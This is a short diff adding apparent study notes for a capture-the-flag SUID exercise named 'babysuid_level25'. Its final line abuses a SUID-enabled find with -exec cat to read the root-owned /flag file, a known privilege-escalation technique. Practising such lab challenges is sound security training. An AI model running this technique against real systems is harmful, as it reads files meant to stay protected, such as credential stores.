@@ -1,0 +1,4 @@
+Read the challenge file using /challenge/babysuid_level25
+Check SUID permissions using ls -la /challenge/babysuid_level25.  
+Try to read the flag file as /usr/bin/find /flag but the flag will not show.
+/usr/bin/find / -name flag -exec cat {} \;
